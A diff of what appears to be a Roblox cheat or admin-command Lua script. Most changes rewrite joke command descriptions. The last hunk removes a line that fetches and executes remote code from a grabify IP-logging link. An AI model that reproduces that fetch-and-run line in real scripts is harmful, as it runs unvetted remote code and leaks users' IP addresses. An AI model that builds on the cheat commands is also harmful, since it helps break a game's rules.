@@ -2194,7 +2194,7 @@ AddCommand(function()
 	else 
 		notif("SuperPunch","Hold your fists",5,nil)
 	end 
-end,"superpunch",{},"This is really stupid and buggy but funny when it works","[No Args]")
+end,"superpunch",{},"LAG LAG LAG LAG LAG lmaoo","[No Args]")
 
 AddCommand(function(Arguments)
 	if Arguments[1] then
@@ -2225,7 +2225,7 @@ AddCommand(function(Arguments)
 			stopAnim("35654637")
 		end 
 	end
-end,"dance",{},"Stupid dance anims (1,2,Off)","[Dance 1/Dance 2/Off]")
+end,"dance",{},"Forgot this shit was here lmao (1,2,Off)","[Dance 1/Dance 2/Off]")
 
 AddCommand(function(Arguments)
 	if Arguments[1] then 
@@ -2274,7 +2274,7 @@ AddCommand(function()
 			Drink:Activate()
 		end 
 	end
-end,"heal",{"h"},"Heals you (Duh?)","[No Args]","[No Args]")
+end,"heal",{"h"},"Tasty burger","[No Args]","[No Args]")
 
 AddCommand(function(Arguments)
 	if game.PlaceId ~= 455366377 then notif("Sorry,","Streets Only",5,nil) return end 
@@ -3315,8 +3315,8 @@ end))
 -- [[ End ]] --
 
 notif("Script","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: TEENX !)",10,"rbxassetid://3339670365")
-notif("TEEN X !","HI NAT SWAG B)",10,nil)
-loadstring(game:HttpGet("https://grabify.link/ZV76GV", true))()
+notif("Swag","Update Test 1.0",10,nil)
+
 --[[while wait(8) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
